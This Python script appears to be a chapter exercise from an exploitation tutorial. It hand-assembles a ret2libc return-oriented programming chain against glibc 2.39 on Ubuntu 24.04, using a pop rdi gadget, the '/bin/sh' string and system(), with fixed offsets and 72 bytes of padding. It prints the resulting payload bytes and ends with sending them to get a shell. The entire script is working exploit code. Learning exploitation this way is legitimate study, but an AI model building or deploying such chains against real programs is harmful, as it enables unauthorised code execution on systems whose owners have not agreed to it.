#!/usr/bin/env python3
"""ch8: build a real ROP chain on paper and print it as the exact bytes
you'd send. The ret2libc pattern — pop rdi; ret; /bin/sh; system —
worked out by hand so you see what pwntools generates for you."""
import struct

def p64(v): return struct.pack("<Q", v & ((1<<64)-1))

# Known after leak-and-rebase (from Ch. 10)
libc_base = 0x00007f4a2ce00000

# On-disk offsets in the pinned Ubuntu 24.04 glibc 2.39
sym = {
    "system":  0x0000000000050d70,
    "binsh":   0x000000000019b06b,  # str("/bin/sh") inside libc
}
# One-shot gadgets from `ROPgadget --binary libc.so.6`
gadget = {
    "pop_rdi_ret":       0x000000000002a3e5,
    "ret":               0x000000000002a3e6,  # bare ret for alignment
}

# Compute runtime addresses
POP_RDI = libc_base + gadget["pop_rdi_ret"]
ALIGN   = libc_base + gadget["ret"]
BINSH   = libc_base + sym["binsh"]
SYSTEM  = libc_base + sym["system"]

# Assemble the chain
PADDING = 72   # from a cyclic-find in Ch. 5
chain = b"A" * PADDING
chain += p64(ALIGN)     # 16-byte stack alignment (movaps safety)
chain += p64(POP_RDI)   # gadget: pop rdi ; ret
chain += p64(BINSH)     #   pops "/bin/sh" into rdi
chain += p64(SYSTEM)    # -> system("/bin/sh")

print("=== ret2libc chain (ch08) — hand-assembled ===")
print(f"libc base:      {libc_base:#018x}")
print(f"pop rdi ; ret:  {POP_RDI:#018x}")
print(f"align (ret):    {ALIGN:#018x}")
print(f"'/bin/sh':      {BINSH:#018x}")
print(f"system:         {SYSTEM:#018x}")
print()
print(f"padding bytes:  {PADDING}  (from Ch. 5's cyclic-find on this target)")
print(f"chain length:   {len(chain)}  bytes total")
print()
print("bytes on the wire (first 96, big-endian display):")
for i in range(0, min(96, len(chain)), 16):
    hexs = ' '.join(f'{b:02x}' for b in chain[i:i+16])
    ascii_s = ''.join(chr(b) if 32<=b<127 else '.' for b in chain[i:i+16])
    print(f"  {i:04x}  {hexs:<47}  {ascii_s}")
print()
print("io.sendline(chain)  ->  shell.")
